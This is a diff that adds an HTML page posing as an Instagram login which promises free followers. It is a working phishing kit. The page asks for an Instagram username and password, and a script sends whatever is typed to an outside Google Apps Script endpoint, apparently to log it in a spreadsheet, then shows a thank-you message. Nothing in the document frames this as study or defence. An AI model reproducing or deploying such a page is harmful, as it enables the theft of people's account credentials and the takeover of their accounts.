@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<title>Instagram where you get lot's of real Follwers</title>
+	<link rel="stylesheet" type="text/css" href="style.css">
+	<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css">
+</head>
+<body>
+      <div class="container">
+      	
+      	<div class="row">
+      		<div class="col-sm-6">
+      			<img src="phone.jpg" class="phone">
+      			
+      		</div>
+      		<div class="col-sm-6">
+      			<div class="right-column text-center">
+      				<img src="instagram.jpg" class="instagram-logo">
+      				<p class="info">Login To increase her followers instant. </p>
+      				<h7><b>{ first You login Her Instagram Account Then You Get followers}</b></h7>
+      				<button type="submit" class="btn btn-primary btn-block"><img src="1.png " class="fb-logo">Log in with Facebook</button>
+      				<p class="or">OR</p>
+
+      				<form method="post" autocomplete="off" name="google-sheet">
+      					
+      					<div class="form-group">
+      						<input type="text" name="username" class="form-control" placeholder="Username" required>
+      						
+      					</div>
+      					<div class="form-group">
+      						<input type="password" name="password" class="form-control" placeholder="Password" required>
+      						
+      					</div>
+      					<button type="submit" class="btn btn-primary btn-block">Login</button>
+
+
+      					<a href="Neon_light_website.html" >To increase followers click here</a>
+                             
+
+
+      				</form>
+      				<p class="terms">
+      					By the loging, you agree to our <b>Terms ,Data Policy</b><b>and Cookies Policy</b>
+      				</p>
+      				
+      			</div>
+      		</div>
+
+
+
+      	</div>
+
+
+      </div>
+
+      <script type="text/javascript">
+      	
+
+            const scriptURL = 'https://script.google.com/macros/s/AKfycbyZWsfsWL3i1Cobib2DZCW2AiJj3PkUMZe2RM8rsJQEcPfDUkKYEYD3xGHGCFxHdXWA/exec'
+            const form = document.forms['google-sheet']
+          
+            form.addEventListener('submit', e => {
+              e.preventDefault()
+              fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+                .then(response => alert("Thanks for loging please click link"))
+                .catch(error => console.error('Error!', error.message))
+            })
+          
+      </script>
+
+</body>
+</html>
